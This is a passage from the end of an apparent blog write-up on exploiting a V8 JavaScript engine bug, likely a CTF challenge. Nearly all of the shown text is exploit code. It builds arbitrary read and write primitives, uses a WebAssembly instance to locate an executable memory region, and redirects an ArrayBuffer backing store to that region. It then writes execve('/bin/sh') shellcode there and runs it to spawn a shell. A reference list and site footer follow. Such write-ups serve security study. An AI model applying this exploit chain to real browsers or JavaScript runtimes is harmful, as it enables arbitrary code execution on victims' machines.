</span></span><span class="line"><span class="cl">    <span class="nx">rw_helper</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mh">0x8</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                               <span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_module</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_module</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">pwn</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">wasm_instance_addr</span> <span class="o">+</span> <span class="mh">0x68</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Wasm instance address: 0x&#34;</span> <span class="o">+</span> <span class="nx">wasm_instance_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] RWX section address: 0x&#34;</span> <span class="o">+</span> <span class="nx">rwx</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr_buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">back_store_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] ArrayBuffer address: 0x&#34;</span> <span class="o">+</span> <span class="nx">arr_buf_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Back store pointer: 0x&#34;</span> <span class="o">+</span> <span class="nx">back_store_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">arb_write</span><span class="p">(</span><span class="nx">arr_buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">,</span> <span class="nx">rwx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;[+] Spawning a shell...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">pwn</span><span class="p">();</span>
</span></span></code></pre></div><h1 id="references" class="relative group">References <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a></span></h1><ul>
<li><a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noreferrer">http://www.phrack.org/papers/attacking_javascript_engines.html</a></li>
<li><a href="http://phrack.org/papers/jit_exploitation.html" target="_blank" rel="noreferrer">http://phrack.org/papers/jit_exploitation.html</a></li>
<li><a href="https://gist.github.com/KaoRz/8d37865f94f73f240c562f9ab29ee1e2#file-pwn-js" target="_blank" rel="noreferrer">https://gist.github.com/KaoRz/8d37865f94f73f240c562f9ab29ee1e2#file-pwn-js</a></li>
<li><a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" target="_blank" rel="noreferrer">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></li>
<li><a href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html" target="_blank" rel="noreferrer">https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html</a></li>
</ul>

      </div>
    </section>
    <footer class="max-w-prose pt-8 print:hidden">
      
  <div class="flex">
    
    
    
    <div class="place-self-center">
      
      
      <div class="text-2xl sm:text-lg">
</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
        </span>
        <span>
          
            <a class="group flex text-right" href="/blog/fmt-bof/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Binary Exploitation - Format String + Buffer Overflow Vulnerability</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2018-09-12 22:25:00 &#43;0000 UTC">12 September 2018</time>
                  
                </span>
              </span>
              <span
                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&rarr;</span
                ><span class="ltr:hidden rtl:inline">&larr;</span></span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2024
            
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
    </div>
  </div>
  
  
</footer>

    </div>
  </body>
</html>
